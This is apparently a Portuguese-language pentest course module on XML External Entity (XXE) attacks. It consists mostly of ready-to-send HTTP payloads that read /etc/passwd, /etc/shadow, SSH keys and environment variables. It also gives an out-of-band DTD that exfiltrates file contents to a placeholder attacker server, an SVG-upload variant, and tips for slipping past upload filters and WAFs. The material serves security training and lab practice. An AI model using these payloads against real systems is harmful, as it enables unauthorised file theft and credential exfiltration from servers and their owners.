# Fase 7: XML External Entity (XXE)

**Tempo estimado:** 30-45 minutos
**Objetivo:** Testar se a aplicação processa XML com DTDs externas, permitindo leitura de arquivos, SSRF e denial-of-service.
**Por quê:** XXE pode ler `/etc/passwd`, `/etc/shadow`, chaves SSH e arquivos de configuração. Em ambientes cloud, pode roubar credenciais via SSRF. É uma vulnerabilidade de impacto CRÍTICO.

---

## O que é XXE?

XML permite definir entidades personalizadas dentro do documento. Uma External Entity pode fazer referência a um arquivo externo:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

Se o servidor processar esse XML, ele vai substituir `&xxe;` pelo conteúdo de `/etc/passwd`. Isso é XXE (XML External Entity).

---

## 7A.1 — Teste Básico de XXE

**O que você vai fazer:** Verificar se a aplicação aceita XML e o processa.

```http
POST /api/xml HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<user>
  <name>test</name>
</user>
```

**O que procurar:**
- **Retornou erro de XML parsing** → XML está sendo processado → pode ser vulnerável
- **Retornou 200 OK com dados** → XML está sendo processado → testar XXE
- **Retornou 400 "Invalid content type"** → App não aceita XML → XXE não é possível

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Não aceita XML | Endpoint não usa XML | Procure outros endpoints que aceitam XML |
| Retorna erro 400 | Content-Type errado | Tente `application/xml`, `text/xml`, `application/soap+xml` |

---

## 7A.2 — XXE para Leitura de Arquivo

```http
POST /api/xml HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"user": {"name": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n..."}}
```

**O que procurar:** Conteúdo do `/etc/passwd` na resposta → **XXE confirmado.**

### Outros arquivos para testar:

| Arquivo | O que contém |
|---------|-------------|
| `file:///etc/passwd` | Usuários do sistema |
| `file:///etc/shadow` | Hashes de senhas (se tiver permissão) |
| `file:///proc/self/environ` | Variáveis de ambiente (pode ter chaves) |
| `file:///proc/self/cmdline` | Comando que iniciou o processo |
| `file:///home/user/.ssh/id_rsa` | Chave SSH privada |
| `file:///var/www/html/config.php` | Configurações do banco de dados |

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Retorna erro 500 | Entidade não é processada | Verifique sintaxe do DTD |
| Retorna dados vazios | Arquivo não existe | Tente outros arquivos |
| `&xxe;` retorna literal | Entidade não é expandida | Verifique se o parser processa DTDs |

---

## 7A.3 — Blind XXE (Out-of-Band)

**O que você vai fazer:** Quando o servidor processa XML mas NÃO retorna a resposta diretamente, usar um servidor externo para exfiltrar dados.

### Passo 1 — Criar DTD malicioso:

Crie um servidor web simples e salve como `xxe.dtd`:

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://SEU_SERVIDOR/?data=%data;'>">
%param;
```

### Passo 2 — Servir o DTD:

```bash
# Criar servidor web temporário
python3 -m http.server 8080
```

### Passo 3 — Enviar payload:

```http
POST /api/xml HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://SEU_SERVIDOR/xxe.dtd">
  %xxe;
]>
<user>
  <name>test</name>
</user>
```

### Passo 4 — Verificar logs:

```
SEU_SERVIDOR - - [12/Sep/2026:10:30:00] "GET /xxe.dtd HTTP/1.1" 200 -
SEU_SERVIDOR - - [12/Sep/2026:10:30:01] "GET /?data=root:x:0:0:root:/root:/bin/bash HTTP/1.1" 200 -
```

**Se o servidor do Collaborator ou seu servidor recebeu a request com dados → Blind XXE confirmado.**

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| DTD não é carregado | Firewall bloqueia acesso externo | Tente via DNS exfil: `http://YOUR_SUBDOMAIN.dnslog.cn` |
| DTD é carregado mas dados não | Entidade não é expandida | Verifique sintaxe do DTD |
| WAF bloqueia DTD externo | Proteção ativa | Tente SVG upload (seção 7A.4) |

---

## 7A.4 — XXE via SVG Upload

**O que você vai fazer:** Upload de SVG (que é XML) para explorar XXE via interface de upload.

```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="test.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="64" font-size="12">&xxe;</text>
</svg>
------boundary--
```

**Como testar:**
1. No Burp, intercepte o request de upload
2. Substitua o conteúdo do SVG pelo payload XXE
3. Envie o request
4. Acesse o SVG carregado e verifique se `/etc/passwd` aparece

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Upload rejeita SVG | Extensão não aceita | Tente renomear para `.svg.jpg` ou `.png` |
| SVG é sanitizado | Tags XML removidas | Tente XXE via outro vetor (XML POST) |

---

## 7A.5 — XXE OOB (Out-of-Band) Completo

### Criar DTD com exfiltração via HTTP:

Salve como `xxe.dtd`:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://COLLABORATOR_ID/?data=%data;'>">
%param;
```

### Enviar payload:

```http
POST /api/xml HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://SEU_SERVIDOR/xxe.dtd">
  %xxe;
]>
<user>
  <name>test</name>
</user>
```

---

## Checklist de XXE

| # | Item | Arquivo gerado | ☑ |
|---|------|---------------|:---:|
| 1 | XXE testado (leitura de arquivo) | `relatorio/xxe-test.txt` | [ ] |
| 2 | Blind XXE testado (OOB) | `relatorio/xxe-blind.txt` | [ ] |
| 3 | XXE via SVG testado | `relatorio/xxe-svg.txt` | [ ] |
| 4 | Arquivos sensíveis enumerados | `relatorio/xxe-files.txt` | [ ] |

### ✅ Sinal de sucesso:
- **XXE confirmado** (leitura de arquivo ou OOB)
- **Dados exfiltrados** via XXE (arquivo de configuração, credenciais)

### ❌ Se falhou:
- App não aceita XML → XXE não é possível neste alvo
- Parser sanitiza DTDs → teste via SVG upload

### 🔗 O que deste arquivo alimenta nas próximas fases:
| Arquivo da Fase 7 | Usado na Fase | Para quê |
|--------------------|---------------|----------|
| `xxe-test.txt` | Fase 12 (Relatório) | Documentar leitura de arquivo |
| `xxe-blind.txt` | Fase 12 (Relatório) | Documentar exfiltração OOB |

**Se completou tudo → Avance para Fase 8** (`08-file-upload.md`)

---

## Mini-Checkpoint: Lab XXE

1. Acesse o lab "Exploiting XXE to retrieve files" no PortSwigger: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
2. Use Burp Repeater para enviar payload XXE no campo de feedback
3. Confirme que `/etc/passwd` foi retornado na resposta

Se conseguiu → avance. Se não → revise a seção 7A.2.
